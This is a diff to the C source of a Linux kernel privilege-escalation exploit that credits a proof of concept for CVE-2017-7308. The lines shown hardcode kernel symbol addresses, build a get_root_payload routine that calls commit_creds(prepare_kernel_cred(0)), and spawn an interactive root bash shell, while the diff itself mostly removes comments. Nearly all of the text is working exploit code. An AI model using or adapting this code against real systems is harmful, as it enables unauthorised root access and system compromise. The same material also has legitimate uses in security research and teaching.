@@ -1,3 +1,10 @@
+/*
+ * Incorporates code from Andrey Konovalov's poc for local root exploit 
+ * for CVE-2017-7308
+ *
+ * nigel.edwards@hpe.com
+ */
+
 #define _GNU_SOURCE
 
 #include <stdbool.h>
@@ -14,9 +21,8 @@
 #define MAGIC_NO '4'
 static int count = 0;
 static unsigned long commit_cred = 0xffffffffad0a4010;
-//static void (*commit_cred)(void*) = (void (*)(void*))0xffffffffad0a4010;
+
 static unsigned long prepare_kernel_cred = 0xffffffffad0a4510;
-//static void *(*prepare_kernel_cred)(unsigned long) = (void *(*)(unsigned long))0xffffffffad0a4510;
 
 /* 
  * Set the message of the device driver 
@@ -36,11 +42,7 @@ void get_root_payload(void) {
 		((_prepare_kernel_cred)(prepare_kernel_cred))(0)
 	);
 }
-/*
-void get_root_payload(void) {
-	commit_cred(prepare_kernel_cred(0));
-}
-*/
+
 void exec_shell() {
 	char *shell = "/bin/bash";
 	char *args[] = {shell, "-i", NULL};
@@ -107,7 +109,6 @@ int main(int argc, char **argv)
 	printf("OKTEST_EXEC done\n");
 
 	check_root();
-
 
 	return 0;
 }
